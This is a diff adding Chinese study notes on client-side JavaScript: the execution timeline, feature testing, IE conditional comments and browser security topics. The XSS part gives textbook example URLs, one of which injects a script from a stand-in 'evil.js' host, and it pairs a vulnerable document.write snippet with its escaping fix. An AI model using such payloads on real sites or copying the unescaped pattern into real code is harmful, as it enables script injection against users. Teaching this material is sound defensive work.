@@ -170,7 +170,7 @@ JavaScript Evaluator
 ## 13.3 执行Javascript程序
 
 执行阶段：
-1. 载入文档内容，并执行<script>元素中的代码（包括外联和内联脚本）。默认按文档的出现顺序，从上往下，遵循控制语句执行
+1. 载入文档内容，并执行`<script>`元素中的代码（包括外联和内联脚本）。默认按文档的出现顺序，从上往下，遵循控制语句执行
 2. 载入文档后且所有脚本执行后，进入异步执行阶段，由事件驱动。事件驱动的第一个事件是load事件。
 
 Javascript都是一个单线程执行模型。脚本与事件处理同一时间只能执行一个，没有并发性。
@@ -247,5 +247,91 @@ onLoad(function() { onLoad.loaded = true; });
 HTML5 后台线程 "WebWorker"
 
 + 客户端Javascript时间线
-![timeline1](../images/timeline1.png)
 
+![timeline1](../images/timeline1.png)
+![timeline2](../images/timeline2.png)
+
+## 13.4 兼容性与互用性
+
++ 处理兼容性问题的类库
+
++ 分级浏览器支持
+
++ 功能测试
+```
+if (element.addEventListener) { // Test for this W3C method before using it
+    element.addEventListener("keydown", handler, false);
+    element.addEventListener("keypress", handler, false);
+}
+else if (element.attachEvent) { // Test for this IE method before using it
+    element.attachEvent("onkeydown", handler);
+    element.attachEvent("onkeypress", handler);
+}
+else {  // Otherwise, fall back on a universally supported technique
+    element.onkeydown = element.onkeypress = handler;
+}
+```
++ 兼容模式 与 标准模式
+
++ 浏览器测试
+
++ IE里的条件注释
+
+```
+<!--[if IE 6]>
+This content is actually inside an HTML comment.
+It will only be displayed in IE 6.
+<![endif]-->
+<!--[if lte IE 7]>
+This content will only be displayed by IE 5, 6 and 7 and earlier.
+lte stands for "less than or equal".  You can also use "lt", "gt" and "gte".
+<![endif]-->
+<!--[if !IE]> <-->
+This is normal HTML content, but IE will not display it
+because of the comment above and the comment below.
+<!--> <![endif]-->
+This is normal content, displayed by all browsers.
+```
+
++ 可访问性
+
+## 13.6 安全性
+
++ Javascript不能做什么
+
+![limit](../images/cantdo.png)
+
++ 同源策略
+
+脚本只能读取和所属文档来源相同的窗口和文档的属性。
+
++ 不严格的同源策略
+1. 将两个窗口包含的脚本把domain设置成相同的值，就不受同源策略的影响
+2. 跨资源共享： 用新的"Origin:" 请求头和新的`Access-Control-Allow-Origin`响应头来扩展HTTP
+3. 跨文档消息：
+
++ 脚本化插件和AcitiveX插件
+
++ 跨站脚本 XSS
+```
+http://www.example.com/greet.html?David
+
+http://www.example.com/greet.html?%3Cscript%3Ealert('David')%3C/script%3E
+
+http://siteA/greet.html?name=%3Cscript src=siteB/evil.js%3E%3C/script%3E
+
+<script>
+var name = decodeURIComponent(window.location.search.substring(1)) || "";
+document.write("Hello " + name);
+</script>
+```
+
+```
+name = name.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+```
+
++ 拒绝服务攻击
+
+## 13.7 客户端框架
+
+jquery
